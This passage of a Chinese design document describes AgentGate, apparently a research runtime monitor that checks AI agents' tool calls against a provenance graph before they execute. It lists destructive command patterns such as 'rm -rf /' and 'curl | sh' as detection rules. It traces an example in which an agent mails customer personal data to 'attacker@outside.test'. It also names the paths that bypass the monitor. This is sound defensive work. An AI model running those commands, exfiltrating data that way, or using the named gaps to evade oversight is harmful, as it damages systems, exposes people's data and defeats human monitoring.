event_by_call: dict[str, str]
incoming: dict[str, list[str]]
outgoing: dict[str, list[str]]
```

GraphDelta 提交时只更新涉及节点和边的索引，不在在线主路径上重扫整个 session graph。
`rebuild_index()` 保留用于恢复或校验。

### 5.14 图存储

当前有两个实现：

| 实现 | 用途 | 并发方式 | TTL |
| --- | --- | --- | --- |
| `InMemoryGraphStore` | 单进程研究 | `asyncio.Lock` | 会话 TTL |
| `RedisGraphStore` | 多实例研究 | Redis WATCH/MULTI 乐观更新 | Redis key TTL |

`graph_id` 由 principal 和 session 生成稳定摘要。Redis key 不包含明文 principal/session。

当设置：

```bash
AGENTGATE_REDIS_URL=redis://127.0.0.1:6379/0
```

`build_runtime()` 会同时选择 Redis graph/state/detection store 和跨实例 session execution lock。
这适合研究实验，但当前不声明生产级高可用或跨多个 store 的分布式事务。

## 6. 模块三：基于图的状态化风险检测与运行时控制

### 6.1 模块三输入与输出

输入：

```text
committed AgentTransitionGraph
+ CandidateGraphExtension
+ SecurityPolicy
+ optional trusted TaskAuthorization
```

输出：

```python
class SecurityDecision:
    decision_id: str
    action: DecisionAction
    rule_ids: list[str]
    reasons: list[str]
    rewritten_arguments: dict | None
    severity: Severity | None
    approval_id: str | None

    matched_event_ids: list[str]
    matched_object_ids: list[str]
    state_facts: list[str]
    relation_evidence: list[str]
    matched_node_ids: list[str]
    matched_edge_ids: list[str]
    propagated_labels: list[SecurityLabel]
```

### 6.2 GraphRiskEngine 的组成

当前图风险引擎按以下顺序收集决策：

```text
SingleCallDetector
GraphPatternEngine
GraphAggregateEngine
untrusted temporal-context fallback
optional GraphRiskResolver
trusted TaskAuthorization
```

多个结果不是多数投票，而按以下优先级取最严格动作：

```text
ALLOW < AUDIT < RESTRICT < REQUIRE_APPROVAL < BLOCK
```

同时合并所有 rule IDs、reasons、matched nodes/edges/objects、labels 和 relation evidence。

### 6.3 单事件检测

即使没有历史图，当前 REQUEST 也会进入 `SingleCallDetector`。默认关注：

- 危险命令模式，例如 `rm -rf /`、`mkfs`、`shutdown`、`curl | sh`；
- 删除受保护路径 `/`、`/etc`、`/usr`、`/var`；
- READ 最大请求范围；
- resource access rules；
- event-condition-action 规则。

默认事件规则包括：

```text
SEND -> UNKNOWN_EXTERNAL
  => AUDIT

DELETE / AUTH / PRIVILEGE / INSTALL
  => AUDIT
```

这些事件规则只表达单次调用的风险先验。危险命令、受保护删除、任务授权违例以及具有直接
provenance/控制依赖的图模式仍会产生 `RESTRICT`、`REQUIRE_APPROVAL` 或 `BLOCK`。

### 6.4 图模式规则 Schema

```python
class GraphPatternRule:
    id: str
    name: str
    trigger: EventCondition
    consumed_labels: set[SecurityLabel]
    scope: GraphRuleScope
    action: DecisionAction
    severity: Severity
    reason: str
```

当前图规则不会声明 ALLOW 或 RESTRICT。检测规则只允许 `AUDIT`、`REQUIRE_APPROVAL`、`BLOCK`。

### 6.5 当前默认图规则

#### 敏感数据外发

```yaml
id: sensitive_data_exfiltration
trigger:
  operations: [SEND]
  trust_domains: [UNKNOWN_EXTERNAL]
consumed_labels: [SENSITIVE]
scope:
  same_task: true
  same_agent: false
action: BLOCK
```

#### 凭证获取后使用

```yaml
id: credential_acquisition_and_use
trigger:
  operations: [AUTH]
consumed_labels: [CREDENTIAL]
action: REQUIRE_APPROVAL
```

#### 不可信数据进入执行

```yaml
id: untrusted_to_execute
trigger:
  operations: [EXECUTE]
consumed_labels: [UNTRUSTED]
action: BLOCK
```

#### 外部下载、落盘并执行

```yaml
id: external_download_write_execute
trigger:
  operations: [EXECUTE]
consumed_labels: [UNTRUSTED, PERSISTENT_ARTIFACT]
action: BLOCK
```

#### 不可信数据进入安装

```yaml
id: untrusted_to_install
trigger:
  operations: [INSTALL]
consumed_labels: [UNTRUSTED]
action: BLOCK
```

#### 不可信数据选择删除目标

```yaml
id: untrusted_to_delete
trigger:
  operations: [DELETE]
consumed_labels: [UNTRUSTED]
action: BLOCK
```

### 6.6 GraphPatternEngine 如何匹配

对当前候选事件：

1. 从 `candidate.consumed_object_ids` 找到 committed DataObject；
2. 根据 same task / same agent 过滤对象；
3. 检查 trigger 的 operation、data types、trust domain、resource 和 effects；
4. 检查 `consumed_labels` 是否是对象标签集合的子集；
5. 沿 DataObject 的 `DERIVES_FROM` 向父对象回溯；
6. 收集其入边中的 `PRODUCES`，形成 committed provenance evidence；
7. 输出 matched node IDs、edge IDs、object IDs 和 propagated labels。

图规则关心的是“当前 sink 消费了什么”，而不是仅判断会话里曾出现过哪些操作。

### 6.7 motivating example 的检测结果

当前候选 event 满足：

```text
operation = SEND
trust_domain = UNKNOWN_EXTERNAL
consumed object = D2
D2.labels contains SENSITIVE
D2 derives from D1
D1/D2.task_id = call-send-3.task_id
```

因此命中：

```text
unknown_external_send          => AUDIT
sensitive_data_exfiltration    => BLOCK
```

合并后结果：

```json
{
  "decision_id": "decision-3",
  "action": "BLOCK",
  "rule_ids": [
    "unknown_external_send",
    "sensitive_data_exfiltration"
  ],
  "reasons": [
    "An unknown external destination is a risk signal; enforcement requires authorization or direct data-flow evidence.",
    "Sensitive or derived data is being sent to an unknown external destination."
  ],
  "severity": "CRITICAL",
  "matched_event_ids": ["call-send-3"],
  "matched_object_ids": ["D2"],
  "matched_node_ids": ["event:event-send-3", "data:D2", "data:D1", "event:event-write-2"],
  "matched_edge_ids": [
    "edge:D2-DERIVES_FROM-D1",
    "edge:E2-PRODUCES-D2",
    "edge:E1-PRODUCES-D1"
  ],
  "propagated_labels": [
    "INTERNAL_ORIGIN",
    "PERSONAL",
    "PERSISTENT_ARTIFACT",
    "SENSITIVE",
    "TOOL_PROVIDED",
    "TRUSTED"
  ],
  "relation_evidence": ["atg_consumes", "atg_label_propagation"]
}
```

完整实现返回 D2 上的全部标签，不会只保留规则直接关心的标签。

上述 ID 为便于阅读的示意值。真实 ID 使用 UUID 或稳定摘要。

由于 `BLOCK.permits_execution=false`：

```text
mail executor 不会被调用
不会生成 SEND RESULT
不会增加实际外发计数
不会提交 TARGETS/CONSUMES/DELEGATES_TO 等候选关系
```

### 6.8 benign counterpart 为什么不会被同一图规则误报

考虑同一会话先读取客户数据，但随后发送一段无关公开文本：

```json
{
  "recipient": "attacker@outside.test",
  "body": "Public service status: operational"
}
```

若当前参数指纹没有匹配 D1/D2，且没有高置信 dependency resolver 关系：

```text
candidate.consumed_object_ids = []
```

因此不会命中 `sensitive_data_exfiltration`。但它仍然是未知外部发送，会命中
`unknown_external_send` 并以 `AUDIT` 记录；在没有其他强证据时调用仍可执行。这一区别是：

```text
外部目的地风险 != 已证明的敏感数据外泄
```

### 6.9 弱时间上下文规则

对于同一 task 先成功读取未知外部或 untrusted 内容，随后发生 SEND、EXECUTE、DELETE、AUTH、
INSTALL，但没有直接 DataObject 依赖时，当前实现返回：

```text
rule_id = untrusted_context_high_risk
action = AUDIT
relation_evidence = [
  atg_same_task_temporal_context,
  dependency_unresolved
]
```

它不会阻断执行，因为这里仅证明同一 task 内存在时间先后，并没有证明不可信数据实际控制了
后续参数。一旦当前参数消费带 `UNTRUSTED` 标签的数据对象，`untrusted_to_execute`、
`untrusted_to_install` 或 `untrusted_to_delete` 等图规则会升级为 `BLOCK`。

### 6.10 累计行为检测

`GraphAggregateEngine` 使用 committed SUCCESS ToolEvent 和 operation index，在 event-time window
内计算：

```text
EVENT_COUNT
或 AFFECTED_COUNT
```

默认规则：

```yaml
operations: [READ]
data_types: [INTERNAL, PERSONAL, FINANCIAL, CREDENTIAL, SECRET]
metric: AFFECTED_COUNT
threshold: 100
window_seconds: 3600
action: BLOCK
```

检测使用“历史实际成功数量 + 当前请求预计数量”。例如历史读取 73 条，当前请求 30 条，预计
总量 103，当前 READ 会在执行前被阻断。

### 6.11 选择性 GraphRiskResolver

当 `candidate.unresolved_dependency=true`，且确定性规则尚未 BLOCK 时，默认 runtime 会调用 LLM
查看有界局部子图。显式设置 `AGENTGATE_LLM_ENABLED=false` 后该阶段关闭。

输入限制：

```text
同 task 最近最多 50 个节点
最多 100 条局部边
candidate event 不包含原始 arguments 和 result
```

严格输出：

```python
class RiskResolution:
    relation_supported: bool | None
    risk_type: str | None
    confidence: float
    evidence_node_ids: list[str]
    explanation: str
```

即使置信度达到默认 `0.8`，当前实现也只添加：

```text
action = AUDIT
rule_id = llm_graph_relation_evidence
```

它不能直接产生 BLOCK。真正阻断仍依赖显式图关系和确定性策略。

`RuntimeOutcome` 会记录：

```text
llm_called
llm_reason
llm_latency_ms
```

### 6.12 RESTRICT

RESTRICT 主要来自可信 `TaskAuthorization` 等约束，而不是检测规则。处理方式是：

1. 使用 `apply_restriction` 验证参数只能缩小能力；
2. 生成新的 Canonical call；
3. 重新构造 REQUEST event；
4. 重新构造 candidate graph；
5. 重新执行全部风险和授权检查；
6. 合并原决策与重检决策。

因此不能通过改写参数绕过图检测。

### 6.13 审批

`REQUIRE_APPROVAL` 会创建一次性审批请求。审批绑定：

```text
principal
session
call_id
tool_name
effective arguments digest
expiry
```

批准后返回 approval token。相同调用携带 token 重试时，运行时消费一次令牌并将动作转换为
ALLOW。无效或过期 token 会变成 BLOCK。

审批 pending 不进入 committed graph。

## 7. motivating example 的完整三模块表示

这一节把场景压缩为一条连续数据链，便于直接用于论文 motivating example。

### 7.1 模块一表示

```text
Raw call c1
  -> CanonicalToolCall(call-read-1, research-agent, customer.read)
  -> REQUEST Event E1_req:
       operation=READ
       resource=DATABASE:C-1024
       data_type=PERSONAL

Tool result r1
  -> RESULT Event E1_res:
       success=true
       affected_count=1
       result contains name/email
```

```text
Raw call c2
  -> CanonicalToolCall(call-write-2, research-agent, report.write)
  -> REQUEST Event E2_req:
       operation=WRITE
       resource=FILE:/tmp/customer-C-1024.json
       input_data_objects=[D1]
       effects=[PERSISTENT_EFFECT]

Tool result r2
  -> RESULT Event E2_res:
       success=true
       output path=/tmp/customer-C-1024.json
```

```text
Raw call c3
  -> CanonicalToolCall(call-send-3, delivery-agent, mail.send)
  -> REQUEST Event E3_req:
       operation=SEND
       input_data_objects=[D2]
       destination=attacker@outside.test
       trust_domain=UNKNOWN_EXTERNAL
       effects=[EXTERNAL_EFFECT]
```

### 7.2 模块二表示

在 c3 到达前的 committed graph：

```text
research-agent --PERFORMS--> E1[READ,SUCCESS]
research-agent --PERFORMS--> E2[WRITE,SUCCESS]

E1 --OPERATES_ON--> customer:C-1024
E1 --PRODUCES--> D1[PERSONAL,SENSITIVE]

E1 --NEXT--> E2
E1 --PARENT_OF--> E2
E2 --OPERATES_ON--> /tmp/customer-C-1024.json
E2 --CONSUMES--> D1
E2 --PRODUCES--> D2[PERSONAL,SENSITIVE,PERSISTENT_ARTIFACT]
D2 --DERIVES_FROM--> D1
```

c3 的 candidate extension：

```text
delivery-agent --PERFORMS--> E3[SEND,CANDIDATE]
research-agent --DELEGATES_TO--> delivery-agent
E2 --PARENT_OF--> E3
E3 --CONSUMES--> D2
E3 --TARGETS--> outside.test[UNKNOWN_EXTERNAL]
```

### 7.3 模块三表示

```text
Trigger:
  E3.operation == SEND
  E3.trust_domain == UNKNOWN_EXTERNAL

Graph relation:
  E3 CONSUMES D2
  D2 DERIVES_FROM D1

Labels:
  D2 contains SENSITIVE + PERSONAL

Decision:
  sensitive_data_exfiltration => BLOCK
```

执行结果：

```text
E3 executor not called
candidate extension discarded
committed graph remains at E1/E2/D1/D2
audit stores request and BLOCK decision
```

## 8. 支持的 Agent 与工具调用形态

| 形态 | 接入类/路径 | 源码改动 | 是否执行前实时仲裁 |
| --- | --- | ---: | ---: |
| 普通 async function tool | `FunctionToolAdapter` | 小 | 是 |
| LangGraph callback | `LangGraphAdapter` | 小 | 是 |
| OpenAI Agents 风格 callback | `OpenAIAgentsAdapter` | 小 | 是 |
| MCP Client/Server | STDIO 或 Streamable HTTP proxy | 通常只改 MCP 配置 | 是 |
| 自研 Agent | `SidecarAdapter` 或 REST API | 中等 | 是 |
| 旧代码 | `RawToolCall` | 小 | 是，但标记为 legacy source |

### 8.1 FunctionToolAdapter

```python
runtime = build_runtime()
adapter = FunctionToolAdapter(runtime)

await adapter.register(
    name="customer.read",
    executor=read_customer,
    capability=ToolCapability(
        tool_name="customer.read",
        possible_operations=[SecurityOperation.READ],
        resource_type=ResourceType.DATABASE,
        resource_arg="customer_id",
        sensitive_output_types={DataType.PERSONAL},
    ),
)

outcome = await adapter.invoke(
    tool_name="customer.read",
    arguments={"customer_id": "C-1024"},
    context=RuntimeContext(
        principal="support-user",
        session_id="session-7",
        task_id="task-customer-summary",
        agent_id="research-agent",
    ),
)
```

`LangGraphAdapter` 和 `OpenAIAgentsAdapter` 复用该 Adapter，只调整不同框架的函数参数顺序，并
设置对应 `source_framework`。

### 8.2 MCP 接入

真实 MCP transport proxy 位于 MCP Client 与 Server 之间：

```text
MCP Client
  -> AgentGate proxy
      -> initialize / tools/list / ping: 转发或处理
      -> tools/call: Canonicalize + Runtime.execute
  -> upstream MCP Server
```

`tools/list` 返回的 name、description、inputSchema、outputSchema 和 annotations 用于自动注册
capability。`tools/call` 只有在 AgentGate 允许后才转发到上游。

STDIO：

```bash
.venv/bin/agentgate mcp-stdio \
  --principal support-user \
  --session-id session-7 \
  --task-id task-customer-summary \
  -- your-upstream-mcp-server --stdio
```

Streamable HTTP：

```bash
.venv/bin/agentgate mcp-http \
  --principal support-user \
  --session-id session-7 \
  --upstream-url http://127.0.0.1:9000/mcp \
  --port 8081
```

Codex 或其他 MCP Client 不需要 AgentGate 专用协议，只需要把 MCP Server 启动/连接地址改成
AgentGate proxy。若 Codex 绕过 MCP 直接执行 shell、文件或网络 API，则不在 AgentGate 的仲裁
范围内。

### 8.3 HTTP Sidecar

Sidecar 请求模型设置 `extra="forbid"`，只接受结构化调用字段。工具可以注册为：

- 仅 capability，用于 `/evaluate`；
- capability + `remote_url`，用于 `/execute` 时调用远程 HTTP executor。

主要接口：

```text
POST /v1/tools/register
GET  /v1/tools/{tool_name}/capability
GET  /v1/tools/{tool_name}/semantic-profile
POST /v1/calls/evaluate
POST /v1/calls/execute
```

## 9. Research API、图调试和审计

### 9.1 Graph Debug API

启用：

```bash
AGENTGATE_RESEARCH_DEBUG=true
```

查询：

```http
GET /v1/sessions/{session_id}/graph?principal=support-user
```

可选过滤：

```text
task_id
agent_id
start
end
```

返回 graph ID、过滤后的 nodes 和内部 edges。DataObject 的 `fingerprints` 会被排除。

### 9.2 Decision Evidence API

```http
GET /v1/decisions/{decision_id}/evidence
```

返回：

```text
decision
matched nodes
matched edges
candidate=true
```

当前 evidence 保存在 runtime 进程内字典，最多 1000 条，不是 Redis 持久化证据仓库。进程重启
后该查询数据会丢失。

当前 `matched_edge_ids` 主要包含 committed provenance 中的 `PRODUCES/DERIVES_FROM` 证据；
candidate `CONSUMES/TARGETS` 通过候选事件、matched object 和 `relation_evidence` 表达，并不保证
全部出现在 `edges` 数组中。这是当前 explain API 的实现边界。

### 9.3 审计日志

Audit event 类型包括：

```text
CALL_REQUEST
DECISION
CALL_RESULT
STATE_UPDATE
GRAPH_UPDATE
RULE_MATCH
APPROVAL
```

后端支持 JSONL 和 SQLite：

```bash
AGENTGATE_AUDIT_BACKEND=jsonl|sqlite
AGENTGATE_AUDIT_PATH=.agentgate/security-audit.jsonl
```

默认事件摘要会对 resource、destination、arguments 和 result 做摘要或省略，不保存敏感明文。
只有明确设置 `AGENTGATE_UNSAFE_DEBUG_AUDIT_PAYLOADS=true` 才会记录 payload。

AgentGate 的 audit/ATG 可以视为安全相关工具轨迹，但不是完整分布式 trace 系统。

## 10. 配置

| 环境变量 | 默认值 | 作用 |
| --- | --- | --- |
| `AGENTGATE_POLICY_PATH` | 内置 YAML | 自定义安全策略 |
| `AGENTGATE_SESSION_TTL_SECONDS` | `3600` | session graph/state TTL |
| `AGENTGATE_HISTORY_LIMIT` | `200` | 兼容敏感事件历史上限 |
| `AGENTGATE_HISTORY_TTL_SECONDS` | `3600` | 兼容历史 TTL |
| `AGENTGATE_LABEL_TTL_SECONDS` | `3600` | 兼容状态标签 TTL |
| `AGENTGATE_APPROVAL_TTL_SECONDS` | `300` | 审批有效期 |
| `AGENTGATE_CONTENT_MODE` | `observe` | `observe` 或 `sanitize` |
| `AGENTGATE_RESEARCH_DEBUG` | `false` | 图和 evidence debug API |
| `AGENTGATE_REDIS_URL` | 无 | Redis 图/状态/锁 |
| `AGENTGATE_INTERNAL_DOMAINS` | 空 | 内部域名逗号列表 |
| `AGENTGATE_TRUSTED_EXTERNAL_DOMAINS` | 空 | 可信外部域名列表 |
| `AGENTGATE_AUDIT_BACKEND` | `jsonl` | JSONL 或 SQLite |
| `AGENTGATE_AUDIT_PATH` | `.agentgate/security-audit.jsonl` | 审计位置 |
| `AGENTGATE_UNSAFE_DEBUG_AUDIT_PAYLOADS` | `false` | 是否保存原始 payload |
| `AGENTGATE_LLM_ENABLED` | `true` | 默认启用选择性 LLM resolver |
| `AGENTGATE_LLM_REQUIRED` | `false` | 缺少 provider 配置时是否拒绝启动 |
| `AGENTGATE_LLM_URL` / `LLM_URL` | 必填 | OpenAI-compatible API base URL |
| `AGENTGATE_LLM_API_KEY` / `LLM_API` | 必填 | API key，不写入审计和评测产物 |
| `AGENTGATE_LLM_MODEL` / `LLM_DEFAULT_MODEL` | `DeepSeek-V4-Pro-0813` | 默认语义模型 |
| `AGENTGATE_LLM_TIMEOUT_SECONDS` | `120` | 单次 HTTP 请求超时 |
| `AGENTGATE_LLM_MAX_ATTEMPTS` | `3` | 可重试错误的最大尝试次数 |
| `AGENTGATE_LLM_CONFIDENCE_THRESHOLD` | `0.75` | 接受工具语义事实的最低置信度；依赖和图关系保持 `0.8` |

`build_runtime()` 默认尝试启用 LLM。URL 和 key 均存在时装配三个 resolver；缺失时健康接口返回
`llm_enabled=false` 并回退为规则路径。要求模型不可用时拒绝启动的实验或部署应设置
`AGENTGATE_LLM_REQUIRED=true`。纯规则消融应显式设置：

```bash
AGENTGATE_LLM_ENABLED=false
```

默认并不意味着每次工具调用都请求模型。工具语义只在注册阶段存在歧义时调用；dependency
resolver 只在确定性 provenance 无法连边时调用；GraphRiskResolver 只在局部图仍有未决依赖且
确定性规则未阻断时调用。三个阶段共用同一模型配置，LLM 只返回有约束的事实或关系，不能直接
返回 `ALLOW` 或 `BLOCK`。

评估 CLI 同样从 `.env` 读取兼容 API 配置。语义金标文件必须显式传入，例如
`python -m agentgate.evaluation llm path/to/capability_gold.yaml`。默认只评估
`DeepSeek-V4-Pro-0813`（可由 `LLM_DEFAULT_MODEL` 覆盖）；只有显式传入 `--stability`
或 `--models` 才会运行其他 `LLM_MODEL_N`。`--timeout-seconds`、`--max-attempts` 和
`--concurrency` 只控制该离线实验，runtime 使用对应的 `AGENTGATE_LLM_*` 参数。CLI 对输入工具
每个模型默认重复3次，并分别报告超时、Schema有效率、语义准确率、一致性、延迟和Token；仓库
不再假定一个已经被清理掉的内置金标文件。

## 11. 兼容旧实现的代码

当前仓库仍保留：

```text
SessionSecurityState
StateManager
RuleMatchState
SequenceEngine
StateRuleDetector
Memory/Redis detection state store
```

`AgentGateRuntime` 在 RESULT 后仍更新这些结构，主要用于：

- 保持已有 benchmark 和测试兼容；
- 提供 `/state`、`/events`、`/rule-state` 研究接口；
- 对比旧的 sequence/state 方法与新的 ATG 方法。

但当前执行前风险主路径已经是：

```text
GraphRiskEngine(committed ATG + candidate extension)
```

旧 `SessionSecurityState` 和 sequence automata 不是模块二的权威图，也不是当前 Runtime 的主要
风险输入。默认 YAML 中仍保留 sequence/state rules 作为兼容实验配置。

## 12. 用户接入 AgentGate 需要提供什么

最低要求：

1. 可经 AgentGate 调用的 executor、远程 HTTP 工具或 MCP Server；
2. 结构化工具 name、description 和 JSON Schema；
3. 可信 `principal` 与 `session_id`；
4. 所有具有安全影响的调用必须经过 AgentGate，而不能保留绕过路径。

为了得到更准确的图，建议额外提供：

```text
稳定 task_id
稳定 agent_id
真实 parent_call_id
内部/可信外部域名配置
业务敏感类型明确的 ToolCapability
高影响多操作工具的 operation_arg + operation_map
```

通常可自动推断的工具：

```text
命名清晰的 read/write/send/delete 工具
Schema 中有 path/recipient/url/limit/body 等明确字段
输出 Schema 明确包含 email/token/card 等敏感字段
```

仍建议显式 capability 的工具：

```text
run_action / process / handle 等通用名称
一个 endpoint 根据 mode 执行 READ/WRITE/DELETE 多种效果
SQL、shell、模板或 DSL 中隐藏复合行为
资源、范围或目的地无法从 Schema 判断
输出敏感性依赖业务知识
AUTH、PRIVILEGE、INSTALL 等高影响能力
```

## 13. 当前安全边界和局限

### 13.1 Complete mediation 范围

AgentGate 只保证经以下路径的工具调用：

```text
FunctionToolAdapter
LangGraph/OpenAI Agents wrapper
MCP transport proxy
HTTP Sidecar / calls execute API
```

不覆盖：

```text
绕过 AgentGate 的 raw shell
直接 socket/network SDK
直接 filesystem API
OS syscall
浏览器 computer-use 像素操作
未被包装的框架内部副作用
```

### 13.2 语义抽取局限

- 规则主要依赖英文名称和 Schema 字段；
- 多操作工具必须显式声明 selector；
- 当前不解析任意 SQL、shell 或代码语义；
- LLM resolver 默认启用且输出是概率性事实；远程服务不可用时会回退，但覆盖率可能下降；
- capability drift 检查使用语义 token Jaccard distance，不能发现所有伪装变化。

### 13.3 Provenance 局限

- 不是 byte-level 或 instruction-level taint；
- 复杂转换、加密、分块、压缩、图片和语义同义改写可能漏检；
- 文件写入后的 DataObject 依赖工具正确返回成功结果；
- 未插桩程序内部的数据流不可见；
- LLM dependency resolver 可能接触敏感参数，需控制数据边界。

### 13.4 图与检测局限

- `NEXT` 只能表示顺序，不能证明因果；
- `PARENT_OF/DELEGATES_TO` 依赖接入方提供 `parent_call_id`；
- 缺少 task_id 时隔离能力下降；
- 图 debug 会遍历并序列化过滤范围内节点，不适合作为高频在线查询；
- 可选 GraphRiskResolver 的局部节点选择使用索引，但当前边过滤仍遍历 `graph.edges.values()`；
- GraphRiskResolver 当前只增加 AUDIT，不自动固化新边；
- evidence store 当前是单进程内存；
- Redis 支持研究型并发，不是生产级高可用设计。

## 14. 与 MalSkills 思路的对应关系

AgentGate 借鉴的是 MalSkills 的方法组织，而不是复制其静态图结构：

```text
MalSkills:
Security-Sensitive Operation Extraction
  -> Static Dependency Graph
  -> Symbolic-first Neuro-Symbolic Reasoning

AgentGate:
Tool Security Event Abstraction
  -> Runtime Agent Transition Graph
  -> Graph-based Pre-execution Enforcement
```

共同点：

```text
operation / operand / value-flow 分离
结构化 LLM 只提取事实
symbolic rule first
局部图推理
```

主要区别：

```text
MalSkills 面向静态 skill/artifact 分析；
AgentGate 面向真实运行时跨工具、跨 Agent 调用，并必须区分 candidate 与 committed facts。
```

## 15. 代码定位

| 功能 | 文件 |
| --- | --- |
| Canonical 表示 | `src/agentgate/semantics/models.py` |
| 结构化语义 LLM wrapper | `src/agentgate/semantics/structured.py` |
| Adapter 统一转换 | `src/agentgate/adapters/canonical.py` |
| Capability 模型 | `src/agentgate/capabilities/models.py` |
| Capability 自动推断 | `src/agentgate/capabilities/inference.py` |
| ToolSecurityEvent | `src/agentgate/events/models.py` |
| REQUEST/RESULT 构造 | `src/agentgate/events/normalizer.py` |
| 参数/目标绑定 | `src/agentgate/events/argument_binding.py` |
| ATG 模型和索引 | `src/agentgate/graph/models.py` |
| candidate/result graph 构造 | `src/agentgate/graph/builder.py` |
| 内存/Redis 图存储 | `src/agentgate/graph/memory_store.py`, `redis_store.py` |
| SecurityLabel | `src/agentgate/labels/` |
| 指纹和轻量来源 | `src/agentgate/state/provenance.py` |
| 可选 dependency resolver | `src/agentgate/provenance/` |
| 图规则 | `src/agentgate/detection/graph_rules.py` |
| 图风险编排 | `src/agentgate/detection/graph_engine.py` |
| 默认策略 | `src/agentgate/policy/default_rules/default.yaml` |
| Runtime reference monitor | `src/agentgate/runtime/gateway.py` |
| 三模块 facade | `src/agentgate/runtime/modules.py` |
| MCP transport proxy | `src/agentgate/adapters/mcp_transport/` |
| 图/决策 API | `src/agentgate/api/sessions.py`, `decisions.py` |
| ATG 测试 | `tests/test_atg.py` |

## 16. 一句话总结当前实现

当前 AgentGate 不是“按工具名阻断危险工具”的规则集合，而是：

```text
先把不同框架的工具调用转成统一安全事件，
再把真正执行过的 Agent、工具、资源、数据和目标增量组织为 ATG，
沿数据来源边传播敏感与信任标签，
最后把当前候选调用作为非提交图扩展进行执行前检测，
在敏感数据或不可信制品真正到达外发、执行、认证或安装 sink 之前实施控制。
```
